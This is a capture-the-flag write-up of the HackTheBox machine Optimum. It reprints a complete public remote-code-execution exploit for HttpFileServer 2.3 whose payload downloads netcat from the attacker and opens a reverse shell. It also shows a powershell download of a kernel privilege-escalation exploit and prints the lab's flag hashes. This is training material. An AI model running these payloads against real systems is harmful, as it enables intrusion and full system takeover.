---
layout: post
title: HackTheBox Optimum
date: 2021-07-15
categories: [HackTheBox, Windows]
tags: [HackTheBox, Windows]
image: https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/image_previews/htb-optimum.png?raw=true
---

# Machine Synopsis

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete. ([Source](https://www.hackthebox.com/machines/optimum))

# Enumeration

```bash
┌──(root💀Shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.8              
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 14:58 +08
Nmap scan report for 10.10.10.8
Host is up (0.17s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   165.43 ms 10.10.14.1
2   165.50 ms 10.10.10.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.69 seconds
```
![Website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Optimum/Website.png?raw=true)

It seems like a normal file server? Let’s search up more about this particular server version!

A quick Google search on ```HttpFileServer 2.3 Exploit``` shows this [RCE](https://www.exploit-db.com/exploits/39161) exploit. 

```bash
#!/usr/bin/python
# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
#Usage : python Exploit.py <Target IP address> <Target Port Number>

#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!


import urllib2
import sys

try:
	def script_create():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

	def execute_script():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

	def nc_run():
		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

	ip_addr = "192.168.44.128" #local IP address
	local_port = "443" # Local Port number
	vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
	save= "save|" + vbs
	vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
	exe= "exec|"+vbs2
	vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
	exe1= "exec|"+vbs3
	script_create()
	execute_script()
	nc_run()
except:
	print """[.]Something went wrong..!
	Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
	Don't forgot to change the Local IP address and Port number on the script"""
          
```
I will be using ```gedit``` to copy the code.

From the instructions of the code, it says that ```You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).```. 

So let’s locate ```nc.exe```.

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# locate nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-resources/binaries/nc.exe

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# cp /usr/share/windows-resources/binaries/nc.exe .

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```
Now we can start a netcat listener and run the exploit `python <exploit>.py <Target IP address> <Target Port Number>`
```bash
┌──(root💀Shiro)-[/home/shiro]
└─# nc -nvlp 443                                                        
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# python rce.py 10.10.10.8 80 
```
Yay, we got a shell!
```bash
C:\Users\kostas\Desktop>dir
22/05/2021  06:52 ��    <DIR>          .
22/05/2021  06:52 ��    <DIR>          ..
18/03/2017  03:11 ��           760.320 hfs.exe
18/03/2017  03:13 ��                32 user.txt.txt

C:\Users\kostas\Desktop>type user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73

C:\Users\kostas\Desktop>systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          22/5/2021, 6:51:15 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.486 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.939 MB
Virtual Memory: In Use:    564 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
# Privilege Escalation

With the `systeminfo`, we can use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) to find exploits.

## Windows Exploit Suggester

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# ./windows-exploit-suggester.py --database 2021-05-16-mssb.xlsx --systeminfo systeminfo.txt

[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
...
```
After researching around, the vulnerability we are interested in should be ```MS16-098```.
```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# searchsploit ms16-098                                               
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Microsoft Windows 8.1 (x64) - 'RGNOBJ' Intege | windows_x86-64/local/41020.c
Microsoft Windows 8.1 (x64) - RGNOBJ Integer  | windows_x86-64/local/42435.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# searchsploit -m 41020.c             
```
Viewing the contents of the code shows that there is an executable online that we can use [here](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe)!

Restart our python server and then download the executable from the victim's machine.

```bash
C:\Users\kostas\Desktop>powershell wget "http://10.10.14.4/41020.exe" -outfile "exploit.exe"
powershell wget "http://10.10.14.4/41020.exe" -outfile "exploit.exe"
C:\Users\kostas\Desktop>exploit.exe
exploit.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>dir
18/03/2017  03:14 ��    <DIR>          .
18/03/2017  03:14 ��    <DIR>          ..
18/03/2017  03:14 ��                32 root.txt

C:\Users\kostas\Desktop>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
51ed1b36553c8461f4552c2e92b3eeed
```
